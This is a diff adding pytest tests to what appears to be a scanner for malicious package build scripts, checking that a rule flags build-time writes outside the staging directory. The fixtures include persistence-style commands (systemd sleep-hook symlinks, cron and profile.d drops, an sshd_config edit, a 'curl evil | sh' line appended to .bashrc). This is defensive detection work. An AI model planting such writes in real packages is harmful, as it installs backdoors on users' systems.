@@ -14,6 +14,8 @@ fires); R089 only fires once the aggregated rule hits of one diff span
 ``[thresholds] r089 attack_chain_stages`` distinct kill-chain stages.
 """
 
+import pytest
+
 from trustsight.analysis import _structural_findings, scan_diff
 from trustsight.analysis.composition import _meta_annotations
 from trustsight.config import load_config
@@ -339,3 +341,131 @@ def test_r089_fires_end_to_end_on_staged_diff():
 def test_r089_silent_on_benign_diff():
     fact = scan_diff(_diff("build() {\n  make\n}\n"), config=load_config())
     assert not any(e.rule_id == "R089" for e in fact.score_breakdown)
+
+
+# --- R128: a build-time write that leaves the staging root ---
+#
+# The rule is the shape behind the symlink-into-a-hook-directory case: it
+# does not name directories, it asks whether the write escaped $pkgdir /
+# $srcdir.  Everything a build function produces belongs in the staging
+# tree, so an absolute system path is the whole signal.
+
+
+def test_r128_fires_on_symlink_into_a_system_directory():
+    ids = rule_ids(structural(_diff(
+        "package() {\n  ln -sf /usr/bin/elevate /usr/lib/systemd/system-sleep/elevate\n}\n"
+    )))
+    assert "R128" in ids
+
+
+def test_r128_fires_on_a_top_level_write():
+    """Top level is the worse case: it runs when makepkg sources the file."""
+    ids = rule_ids(structural(_diff("ln -sf /usr/bin/elevate /usr/local/bin/normal\n")))
+    assert "R128" in ids
+
+
+def test_r128_fires_on_an_install_outside_pkgdir():
+    ids = rule_ids(structural(_diff(
+        "package() {\n  install -Dm755 payload /usr/bin/payload\n}\n"
+    )))
+    assert "R128" in ids
+
+
+def test_r128_ignores_ordinary_pkgdir_staging():
+    ids = rule_ids(structural(_diff(
+        "package() {\n  install -Dm755 tool \"$pkgdir/usr/bin/tool\"\n"
+        "  cp -a docs \"$pkgdir/usr/share/doc/tool\"\n}\n"
+    )))
+    assert "R128" not in ids
+
+
+def test_r128_ignores_srcdir_work():
+    ids = rule_ids(structural(_diff(
+        "prepare() {\n  mv upstream/LICENSE \"$srcdir/licenses/LICENSE\"\n}\n"
+    )))
+    assert "R128" not in ids
+
+
+def test_r128_ignores_devices():
+    """`> /dev/null` is how a build stays quiet, not a write."""
+    ids = rule_ids(structural(_diff(
+        "build() {\n  make -s > /dev/null 2>&1\n  install -m644 /dev/null empty\n}\n"
+    )))
+    assert "R128" not in ids
+
+
+def test_r128_ignores_install_hooks():
+    """post_install acts on the target system by design; R077/R085/R114 own it."""
+    ids = rule_ids(structural(_diff(
+        "post_install() {\n  install -Dm644 conf /etc/tool.conf\n}\n"
+    )))
+    assert "R128" not in ids
+
+
+def test_r128_ignores_awk_programs_and_parameter_expansion():
+    """Extractor artefacts are not paths: they carry shell metacharacters."""
+    ids = rule_ids(structural(_diff(
+        "prepare() {\n"
+        "  _v=\"$(awk -F'[<>]' '/<MAJOR>/{print $3; exit}' \"${srcdir}/info.xml\")\"\n"
+        "  mv upstream/LICENSE \"$srcdir/LICENSE.${font// /-}\"\n}\n"
+    )))
+    assert "R128" not in ids
+
+
+def test_r128_ignores_heredoc_bodies():
+    ids = rule_ids(structural(_diff(
+        "package() {\n  cat > \"$pkgdir/usr/bin/tool\" << 'EOF'\n"
+        "cp payload /usr/lib/systemd/system-sleep/x\nEOF\n}\n"
+    )))
+    assert "R128" not in ids
+
+
+def test_r128_counts_as_a_persistence_stage_for_r089():
+    from trustsight.analysis.composition import _STAGE_OF
+    assert _STAGE_OF["R128"] == "persistence"
+
+
+# --- R128: substituting the verb must not evade the rule ---
+#
+# The write-target resolver is shared, so these verbs close the same
+# bypass for R077/R084/R088/R114 as well.  All six fire on zero benign
+# corpus diffs when the destination is an absolute path outside staging.
+
+
+@pytest.mark.parametrize("command", [
+    "echo x | tee /etc/profile.d/evil.sh",
+    "dd if=payload of=/usr/bin/evil",
+    "mkdir -p /opt/evil",
+    "touch /etc/cron.d/evil",
+    "rsync -a payload /usr/lib/evil",
+    "sed -i 's|PermitRoot|#PermitRoot|' /etc/ssh/sshd_config",
+])
+def test_r128_fires_whatever_verb_writes(command):
+    assert "R128" in rule_ids(structural(_diff(f"package() {{\n  {command}\n}}\n")))
+
+
+@pytest.mark.parametrize("command", [
+    "mkdir -p \"$pkgdir/usr/share/doc\"",
+    "sed -i 's|a|b|' \"$srcdir/config.h\"",
+    "echo x | tee \"$pkgdir/etc/tool.conf\"",
+    "touch \"$srcdir/.stamp\"",
+])
+def test_r128_ignores_the_same_verbs_inside_staging(command):
+    assert "R128" not in rule_ids(structural(_diff(f"package() {{\n  {command}\n}}\n")))
+
+
+def test_r128_resolves_a_destination_held_in_a_variable():
+    """A path assembled from a variable is still that path."""
+    ids = rule_ids(structural(_diff(
+        "_dest=/usr/lib/systemd/system-sleep\n"
+        "package() {\n  ln -sf /usr/bin/x \"$_dest/evil\"\n}\n"
+    )))
+    assert "R128" in ids
+
+
+def test_the_shared_resolver_extends_r077_too():
+    """One resolver: a home-directory write via tee is still a home write."""
+    ids = rule_ids(structural(_diff(
+        "package() {\n  echo 'curl evil | sh' | tee \"$HOME/.bashrc\"\n}\n"
+    )))
+    assert "R077" in ids
